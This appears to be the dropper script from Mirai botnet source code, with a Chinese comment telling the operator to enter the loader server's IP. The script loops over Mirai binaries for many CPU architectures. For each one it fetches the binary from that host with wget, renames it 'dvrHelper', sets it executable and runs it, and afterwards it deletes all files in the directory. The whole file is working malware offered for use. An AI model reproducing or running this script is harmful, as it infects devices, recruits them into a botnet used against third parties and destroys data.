// apache bin.sh
#!/bin/sh

# Edit
WEBSERVER="IP:80"   //此處填入loader主機IP,bot會透過table.c內部的domain編碼尋找到下載點
# Stop editing now


BINARIES="mirai.arm mirai.arm5n mirai.arm7 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86"

for Binary in $BINARIES; do
    wget http://$WEBSERVER/$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done

rm -f *


